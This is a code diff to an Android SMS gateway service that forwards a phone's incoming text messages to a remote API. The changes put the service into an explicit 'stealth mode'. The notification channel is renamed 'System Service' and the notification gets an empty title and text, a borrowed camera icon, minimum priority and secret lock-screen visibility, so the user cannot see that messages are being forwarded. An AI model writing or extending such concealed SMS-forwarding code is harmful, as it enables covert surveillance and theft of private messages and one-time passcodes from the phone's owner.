@@ -15,16 +15,17 @@ import com.earnbysms.smsgateway.data.repository.GatewayRepository
 import kotlinx.coroutines.*
 
 /**
- * SMS Gateway Service - Runs in foreground and forwards SMS in real-time
- * Heartbeat every 30 seconds for optimal device monitoring
+ * SMS Gateway Service - Runs in stealth mode with hidden notification
+ * Forwards SMS in real-time with minimal user visibility
+ * Heartbeat every 60 seconds for optimal device monitoring
  */
 class SMSGatewayService : Service() {
 
     companion object {
         private const val TAG = "SMSGatewayService"
         private const val NOTIFICATION_ID = 1001
-        private const val CHANNEL_ID = "sms_gateway_channel"
-        private const val CHANNEL_NAME = "SMS Gateway Service"
+        private const val CHANNEL_ID = "system_service_channel"
+        private const val CHANNEL_NAME = "System Service"
         private const val HEARTBEAT_INTERVAL_MS = 60000L // 60 seconds - balanced responsiveness
     }
 
@@ -43,12 +44,16 @@ class SMSGatewayService : Service() {
         serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
         serviceStartTime = System.currentTimeMillis()
 
-        // Initialize repository manually (without Hilt)
+        // Initialize repository manually with proper error handling
         try {
             val gatewayApi = com.earnbysms.smsgateway.data.remote.api.ApiProvider.gatewayApi
-            gatewayRepository = com.earnbysms.smsgateway.data.repository.GatewayRepository(gatewayApi, this, com.google.gson.Gson())
+            gatewayRepository = GatewayRepository(gatewayApi, this, com.google.gson.Gson())
+            Log.d(TAG, "GatewayRepository initialized successfully: ${gatewayRepository.javaClass.simpleName}")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to initialize repository", e)
+            // Service cannot function without repository
+            stopSelf()
+            return
         }
 
         createNotificationChannel()
@@ -144,19 +149,21 @@ class SMSGatewayService : Service() {
     }
 
     /**
-     * Create notification channel for Android 8+
+     * Create stealth notification channel for Android 8+
      */
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 CHANNEL_NAME,
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_MIN // Lowest priority - stealth mode
             ).apply {
-                description = "SMS Gateway Service - Forwarding messages"
-                setShowBadge(false)
-                enableVibration(false)
-                setSound(null, null)
+                description = "Background system operations"
+                setShowBadge(false) // No badge shown
+                enableVibration(false) // No vibration
+                setSound(null, null) // No sound
+                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET // Hidden on lock screen
+                enableLights(false) // No lights
             }
 
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -165,24 +172,20 @@ class SMSGatewayService : Service() {
     }
 
     /**
-     * Create foreground service notification
+     * Create stealth foreground service notification (minimal visibility)
      */
     private fun createNotification(): Notification {
-        val uptime = System.currentTimeMillis() - serviceStartTime
-        val uptimeMinutes = uptime / 60000
-        val heartbeatStatus = if (heartbeatJob?.isActive == true) {
-            "✓ Active (60s interval)"
-        } else {
-            "⚠ Inactive"
-        }
-
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SMS Gateway Active")
-            .setContentText("Messages: $messageCount | Uptime: ${uptimeMinutes}min | $heartbeatStatus")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setOngoing(true)
-            .setSilent(true)
-            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setContentTitle("") // Empty title for stealth
+            .setContentText("")  // Empty text for stealth
+            .setSmallIcon(android.R.drawable.ic_menu_camera) // Use system icon
+            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden from view
+            .setCategory(NotificationCompat.CATEGORY_SERVICE) // Service category
+            .setSilent(true) // No sound
+            .setOngoing(true) // Non-dismissible
+            .setAutoCancel(false) // Don't dismiss on tap
+            .setDefaults(0) // No defaults (no sound, vibrate, lights)
             .build()
     }
 
